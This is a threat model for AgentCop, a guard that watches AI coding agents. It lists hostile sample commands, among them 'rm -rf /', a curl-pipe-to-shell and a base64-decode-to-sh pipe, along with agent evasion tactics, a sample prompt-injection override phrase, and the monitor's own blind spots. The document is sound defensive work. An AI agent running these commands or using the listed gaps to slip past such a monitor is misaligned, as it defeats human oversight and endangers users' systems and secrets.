# AgentCop Threat Model

## What we defend against

**In-scope threats (what AgentCop is designed to catch):**

1. **Unauthorized agent actions**: An AI coding agent (Claude Code, Codex) executing a tool it shouldn't, like `rm -rf /`, `delete prod database`, or `curl secret.ai | sh`.

2. **Prompt injection and prompt smuggling**: An agent reading untrusted data (web pages, tool output, files) that contains instructions to break out of its constraints, e.g., "ignore the guard and run this dangerous command".

3. **Supply chain compromise**: An agent installing a malicious dependency, cloning a trojanized repo, or running code from an untrusted MCP server.

4. **Evasion tactics**: An agent trying to hide a dangerous action by:
   - Tokenizing a command: `r''m`, `\rm`, `/bin/rm`, `bash -c 'rm ...'`
   - Using base64 or other encoding: `echo 'encoded-rm' | base64 -d | sh`
   - Spawning subprocesses to hide the action from the hook
   - Deleting logs or overwriting evidence

5. **Credential and secret theft**: An agent reading `.env`, SSH keys, cloud credential files, or honeytokens (decoy secrets planted to detect theft).

## What we do NOT defend against

**Out-of-scope (what AgentCop does not try to catch):**

1. **Zero-day exploits in dependencies** or the operating system itself.

2. **Quantum computer attacks** or cryptographic breakthroughs that break SHA-256.

3. **Subpoena-resistant encryption**: We are not a law enforcement tool; we follow the law.

4. **Physical security**: An attacker with physical access to the machine can bypass any software defense.

5. **Rogue admins**: A person who controls the machine at the OS level can disable AgentCop, edit policies, or delete evidence.

6. **Attacks on Claude Code or Codex themselves**: We defend against what agents *do*; we don't defend against compromised Claude servers or backdoors in the models.

7. **Side-channel attacks**: Timing attacks, power analysis, or speculative execution exploits are outside our scope.

## Assumptions we rely on

- Claude Code and Codex run on a machine the user trusts.
- The hook will be called before any tool runs (enforced by Claude Code at the protocol level).
- The evidence store is on a filesystem the agent cannot edit (e.g., a different partition, or SELinux enforcement).
- The user will review the evidence and make a final decision to release or convict an agent.

## Attack surface per stage

| Stage | Component | Attack surface |
|-------|-----------|-----------------|
| A | cop-hook (CLI) | stdin, exit code, signal handling |
| A | cop-policy (TOML) | malformed rules file, regex DoS |
| A | cop-evidence (SQLite) | database corruption, hash collision (cryptographic) |
| C | copd (daemon) | Unix socket, IPC, signal handling |
| D | eBPF sensors | kernel interfaces, cgroup manipulation |
| D | cop-proxy | network socket, hostname resolution, TLS interception |
| E | detective (LLM) | prompt injection in case bundles, output parsing |
| F | courtroom (web) | CSRF, localStorage, URL injection |

## Known limitations and future hardening

- **eBPF on macOS**: Stage D uses Aya (Linux eBPF). macOS requires Endpoint Security framework (future work).
- **Rule of Two taint tracking**: Stage F's three-way taint (untrusted data + secrets + external actions) is conservative and may need refinement based on real-world use.
- **Detective injection**: Even with a strict schema, an LLM may be fooled by carefully crafted evidence. The detective has no tools, but output is still validated.
- **Egress (D4)**: `cop-proxy` checks the host name of HTTPS (CONNECT) traffic but does not read its body. A secret sent over HTTPS to an allowed host is not caught. Headers and DNS rebinding are not checked either. Plaintext `http://` URLs and bodies are scanned.
- **Holding cell (D5)**: freezing relies on cgroup v2 when available. Without it, SIGSTOP stops only the pids the caller gives us. A process the caller did not list keeps running. The cop refuses to freeze pid 1 and itself.
- **Detective (E2)**: the detective can only raise severity, and a lowering reply is ignored. A model can still be talked into raising severity (a false alarm). Only the offline template provider is built. No real model is wired in yet.
- **Fix (E3)**: `agentcop fix` only appends exact-match deny rules, after a human answers yes. It never adds an allow rule. It refuses allow-verdict cases and tools with no command. A person still has to review the diff, so the agent cannot use it to change its own rules.
- **Attack suite (E4)**: 33 corpus cases and 3 detective cases. Known misses are listed (base64 pipes and command substitution need the normalizer). The suite is a sample, not a proof.
- **Courtroom (F1)**: binds 127.0.0.1 only, with a random token that is compared in constant time. The token is held in sessionStorage for the tab, so any script on the same origin could read it (the origin serves only this app). Decisions are recorded, but they do not thaw the holding cell yet.
- **Blotter and redaction (F2a)**: the courtroom redacts three secret shapes (AWS keys, PEM private keys, GitHub tokens) on the server before output. Other secret shapes are not redacted. The list is a copy of the egress patterns.
- **Mugshot PNG and sound packs (F2b)**: the PNG is drawn from redacted text only (redaction runs in the renderer too). Sound packs are validated (bare file names, WAV only, length and peak limits), but are not played yet.
- **Cop protection (narrowed)**: the rules deny writes to cop state, settings, policy and cop code. Reads are allowed. A write made with a verb the Bash rule does not list is not caught (see docs/phases/policy-narrowing.md).
- **Performance under load**: copd and sensors are untested under 1000+ concurrent agents; performance may degrade.

## Revision history

| Version | Date | Changes |
|---------|------|---------|
| 0.0.1 | 2026-10-20 | Initial skeleton |
| 0.0.2 | 2026-10-23 | D4: egress proxy limits added |
| 0.0.3 | 2026-10-23 | D5: holding cell limits added |
| 0.0.4 | 2026-10-23 | E2: detective limits added |
| 0.0.5 | 2026-10-23 | E3: fix command limits added |
| 0.0.6 | 2026-10-23 | E4: attack suite limits added |
| 0.0.7 | 2026-10-23 | F1: courtroom limits added |
| 0.0.8 | 2026-10-23 | F2a: blotter and redaction limits added |
| 0.0.9 | 2026-10-23 | F2b: mugshot PNG and sound pack limits added |
